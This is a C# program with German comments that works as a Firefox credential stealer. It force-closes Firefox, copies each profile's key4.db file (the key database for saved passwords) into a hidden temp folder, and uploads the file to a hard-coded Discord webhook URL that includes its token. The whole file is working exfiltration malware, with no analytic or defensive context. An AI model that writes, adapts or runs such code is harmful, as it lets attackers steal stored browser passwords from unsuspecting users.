using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
using System.Net.Http;
using System.Security.AccessControl;

namespace Ggezl2p
{
    class Program
    {
     

        static void Main(string[] args)
        {
            //Firefox Open Check

            if(IsFirefoxRunning())
            {
                Console.WriteLine("Firefox is running. Closing Firefox...");
                CloseFirefox();
                Thread.Sleep(2000);
            }
            else
            {
                Console.WriteLine("Firefox is not running. Opening Firefox...");
                OpenFirefox();
                Thread.Sleep(2000);
                Console.WriteLine("Closing Firefox...");
                CloseFirefox();
                Thread.Sleep(2000);
            }

            static bool IsFirefoxRunning()
            {
                Process[] processes = Process.GetProcessesByName("firefox");
                return processes.Length > 0;
            }

            static void CloseFirefox()
            {
                Process[] processes = Process.GetProcessesByName("firefox");
                foreach (Process process in processes)
                {
                    process.CloseMainWindow();
                    process.WaitForExit();
                }
            }

            static void OpenFirefox()
            {
                Process.Start(@"C:\Program Files\Mozilla Firefox\firefox.exe");
            }

            // Verzeichnis erstellen oder zurücksetzen
            DirectoryInfo dir = new DirectoryInfo(@"%temp%\a74Bas57M");
            try
            {
                if (dir.Exists)
                {
                    dir.Attributes = dir.Attributes & ~FileAttributes.ReadOnly;
                    dir.Delete(true);
                }
                dir.Create();
                Console.Write("Verzeichnis erstellt.");
            }
            catch (Exception ex)
            {

            }

            //unterordner checken
            string sourceDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla", "Firefox", "Profiles");
            string destDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp", "a74Bas57M", "Profiles");



            if (!Directory.Exists(destDir))
            {
                Directory.CreateDirectory(destDir);
                Console.WriteLine("Verzeichnis erstellt.");
            }

            try
            {
                // Alle Key4.db-Dateien in den Unterordnern von "Profiles" filtern
                var dirs = new DirectoryInfo(sourceDir).GetDirectories();
                foreach (var subdir in dirs)
                {
                    var files = subdir.GetFiles("key4.db");
                    foreach (var file in files)
                    {
                        // Datei kopieren
                        string destFilePath = Path.Combine(destDir, file.Name);
                        file.CopyTo(destFilePath, true);
                        Console.WriteLine($"Datei {file.Name} erfolgreich kopiert.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Fehler beim Kopieren der Datei: {ex.Message}");
            }

            //Webhook verschicken
            string Webhook_link = "https://discord.com/api/webhooks/1093683641068044378/KCPO4Q-xlX3zcMR25Ukt5L8LnVw_YwbsGFVLjZE142Pb3Is-7OM0eOYuR2QMWr1Lv0Go";
            string FilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp", "a74Bas57M", "Profiles", "key4.db");
            
            using (HttpClient httpClient = new HttpClient())
            {
                MultipartFormDataContent form = new MultipartFormDataContent();
                var file_bytes = System.IO.File.ReadAllBytes(FilePath);
                form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Data Base File", "key4.db");
                httpClient.PostAsync(Webhook_link, form).Wait();
                httpClient.Dispose();
            }

        }
    }
}
